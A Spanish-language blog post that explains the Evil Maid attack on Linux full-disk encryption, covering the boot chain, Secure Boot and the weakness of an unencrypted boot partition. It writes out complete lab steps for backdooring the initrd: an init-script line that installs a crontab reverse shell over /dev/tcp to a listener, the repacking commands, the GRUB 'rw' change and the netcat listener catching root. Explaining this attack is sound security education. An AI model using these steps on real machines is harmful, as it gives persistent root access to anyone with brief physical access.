---
    title: Así atacan el cifrado de disco en Linux
    date: 2026-03-27
---

Hoy en día llevamos prácticamente toda nuestra vida con nosotros:  móviles, portátiles, cuentas y comunicaciones. Gran parte de nuestra  información está almacenada en estos dispositivos y, aunque la mayoría  incluyen full disk encryption, la policía sigue pudiendo desbloquear la mayoría de estos.

En este artículo vamos a explorar el ataque Evil Maid contra el cifrado de disco en Linux. Resumiéndolo, se trata de un ataque en el que alguien con acceso físico a tu equipo puede modificarlo sin que te des cuenta, alterando el proceso de arranque para ejecutar código malicioso. Es el típico escenario de dejar el portátil en la habitación del hotel y que, mientras no estás, alguien lo manipule sin que te des cuenta.

Como veremos, el problema no está en el cifrado de Linux en sí, sino en una incorrecta implementación del arranque.

## ¿Cómo funciona el arranque en Linux?

Antes de entrar en cómo se lleva a cabo este ataque, vamos a ver cómo  arranca un sistema Linux. En términos generales, podemos resumirlo  de la siguiente manera:

**[Encendido] → [UEFI] → [Bootloader] → [Kernel+Initrd] → [Init system] → [Login]**

Al encender el equipo, el firmware UEFI se ejecuta y toma el control  realizando una serie de comprobaciones para asegurarse de que el  hardware está bien. Una vez finalizadas, consulta las entradas de  arranque almacenadas en la NVRAM. Cada una de estas entradas contiene la  ruta completa a un binario EFI (normalmente un bootloader) ubicado en  la partición EFI. Dado que UEFI es capaz de leer sistemas de archivos  FAT, puede localizar estos binarios, cargarlos en memoria y  transferirles la ejecución.

Ejecutando el comando `sudo efibootmgr` podemos ver qué aplicación EFI se va a ejecutar al iniciar el sistema:

```
BootCurrent: 0008
Boot0008* debian HD(1,GPT,75a8d3c7-0bb8-47ff-8f65-68a0d25b71ab,0x800,0x3c800)/File(\EFI\debian\shimx64.efi)
```

En este caso, UEFI arrancará el archivo `shimx64.efi` de Debian, un bootloader intermedio firmado por Microsoft que permite iniciar Linux con Secure Boot habilitado. Este bootloader transfiere la ejecución al bootloader real, que normalmente es GRUB (`grubx64.efi`).

Una vez que se ejecuta GRUB, este accede a la partición boot y lee su archivo de configuración `grub.cfg`. Si existen varias opciones de kernel o sistemas operativos, muestra un menú de arranque y aplica los parámetros de kernel definidos en la configuración. Para terminar, GRUB carga tanto el kernel de Linux como el initrd en memoria y deriva la ejecución del arranque al kernel.

```
/boot/initrd.img-6.12.74+deb13+1-amd64
/boot/vmlinuz-6.12.74+deb13+1-amd64
```

En este punto, el kernel aún está comprimido, por lo que lo primero que hace al ejecutarse es descomprimirse e inicializarse, configurando el entorno básico de hardware: CPU, memoria RAM, buses y dispositivos esenciales. Para continuar, el kernel debe montar la partición raíz, pero este no tiene soporte integrado para todas las configuraciones posibles de almacenamiento como, RAID, LVM, discos cifrados, distintos sistemas de archivos, etc.

Por ello, el kernel monta el initrd, un sistema de archivos comprimido cargado en RAM, que contiene todos los módulos y utilidades necesarios para el hardware específico del sistema. En esta fase, se ejecutan scripts que permiten, por ejemplo, desencriptar discos, montar volúmenes RAID o LVM y preparar todo lo necesario para finalmente montar el sistema de archivos raíz (/) y continuar con el arranque del sistema operativo.

Una vez montada la partición raíz, se ejecuta el proceso init o systemd. Este proceso inicializa todos los servicios del sistema, como el montaje de otras particiones, la configuración de red, el inicio de demonios y servicios esenciales, y el arranque de la interfaz gráfica si aplica.

## Backdoor a partición de arranque sin cifrar

Al habilitar la opción de cifrado de disco en la mayoría de los instaladores de Linux, estos suelen crear el mismo esquema de particiones: una partición EFI para los bootloaders, una partición de arranque que contiene el kernel, el `initrd` y la configuración de GRUB, y la partición raíz cifrada.

```
vda            254:0    0    5G  0 disk
├─vda1         254:1    0  121M  0 part  /boot/efi
├─vda2         254:2    0  488M  0 part  /boot
└─vda3         254:3    0  4,4G  0 part
  └─vda3_crypt 253:0    0  4,4G  0 crypt /
```

Como hemos visto, el kernel para descifrar las particiones necesita unos scripts y módulos que se encuentran en el initrd. La idea es modificar estos scripts para añadir código que nos permita crear un backdoor en el sistema una vez esté descifrado.

Como no tenemos acceso al sistema, arrancamos mediante un live cd y montamos la partición boot en el entorno en vivo. Para realizar el ataque vamos a obtener el archivo initrd y vamos a descomprimirlo con la utilidad unmkinitramfs.

```
alzze@ubuntu:$ ./unmkinitramfs -v initrd.img-6.12.74+deb13+1-amd64 extracted-initrd
.
kernel
kernel/x86
kernel/x86/microcode
kernel/x86/microcode/AuthenticAMD.bin
```

Una vez descomprimido, vemos que contiene un script `main/init`. Este script es el primer proceso que se ejecuta en espacio de usuario dentro del initramfs y se encarga de cargar módulos, detectar dispositivos y configurar el entorno básico, dejando listo el sistema para montar finalmente la partición raíz.

En este punto ya se tiene acceso a una de las fases más críticas del arranque de Linux, donde se realiza el descifrado del disco y se prepara la partición raíz. Cualquier modificación en este entorno puede afectar directamente a la seguridad del sistema. Por ejemplo, se podría alterar el binario `/sbin/cryptroot` o los distintos scripts que lo ejecutan para añadir un backdoor en la utilidad encargada de descifrar las particiones.

```
alzze@ubuntu:main $ grep -RnI "/sbin/cryptsetup" . | wc -l
11
```

En este caso vamos a modificar el script `init`, añadiendo un backdoor sencillo que nos permita establecer una reverse shell una vez el sistema haya arrancado por completo. Esto abriría la puerta a la ejecución de todo tipo de malware en el sistema, como cryptominers, keyloggers, ransomware...

```
#Backdoor
CRON="${rootmnt}/etc/crontab"
LINE='* * * * *  root /bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.2/9001 0>&1"'
grep -Fq "$LINE" "$CRON" || echo "$LINE" >> "$CRON"

# Chain to real filesystem
exec run-init ${drop_caps} "${rootmnt}" "${init}" "$@" <"${rootmnt}/dev/console" >"${rootmnt}/dev/console" 2>&1
echo "Something went badly wrong in the initramfs."
panic "Please file a bug on initramfs-tools."
```

Volvemos a comprimir el archivo y lo cambiamos con el initrd original.

```
#!/bin/bash
cd extracted/early
find . -print0 | cpio --null -o -H newc > ../../early.cpio
cd ../early2
find . -print0 | cpio --null -o -H newc > ../../early2.cpio
cd ../main
find . -print0 | cpio --null -o -H newc > ../../main.cpio
cd ../..
zstd -T0 -19 main.cpio -o compressed-main.cpio

cat early.cpio early2.cpio compressed-main.cpio > initrd.img-6.12.74+deb13+1-amd64-modified
```

Debian pasa por defecto al kernel el parámetro `ro`, lo que hace que el sistema de archivos raíz se monte en modo solo lectura durante el arranque. Como necesitamos modificar archivos del sistema para introducir el backdoor, es necesario ajustar la configuración de GRUB y cambiar este parámetro a `rw`, permitiendo así el montaje con permisos de escritura desde las primeras fases del arranque.

```
linux   /vmlinuz-6.12.74+deb13+1-amd64 root=UUID=c52d35dc-fe65-4d68-ae0c-812f866b19d3 rw  quiet
```

A partir de ahora cuando el sistema arranque tendremos acceso permanente al sistema con usuario root.

```
alzze@ubuntu:~ $ nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 127.0.0.1 53662
root@deb:~#
```

## Evil Maid Attack a FDE

La mayoría de instaladores de Linux no implementan Full Disk Encryption (FDE) completo. Aunque GRUB sí lo soporta, en estos casos la partición de arranque está cifrada, pero el ataque no desaparece: simplemente cambia de lugar.

Ya no es posible modificar el `initrd` o los scripts de arranque como antes, porque todo ese contenido está cifrado. En este escenario, el objetivo pasa a ser el bootloader.

GRUB, en configuraciones con FDE, se encarga de pedir la passphrase, descifrar el volumen y cargar el kernel. Si un atacante modifica su binario EFI en la partición EFI, puede introducir código que se ejecute antes del descifrado. Sigue siendo un EMA, pero atacando el bootloader.

El problema sigue siendo el mismo: no se verifica la integridad de lo que se ejecuta en el arranque.

Aquí entra Secure Boot. UEFI solo ejecuta binarios firmados y de confianza. Si GRUB ha sido modificado, la firma deja de ser válida y el sistema bloquea el arranque. Esto introduce una cadena de confianza que impide este tipo de ataques. Aun así, depende de la configuración. Si Secure Boot puede desactivarse o se añaden claves maliciosas, la protección deja de ser efectiva.

Para no alargar más el post, no vamos a entrar en la implementación de Secure Boot. Quizá en el futuro nos metamos en la madriguera del TPM y todo lo que hay detrás.
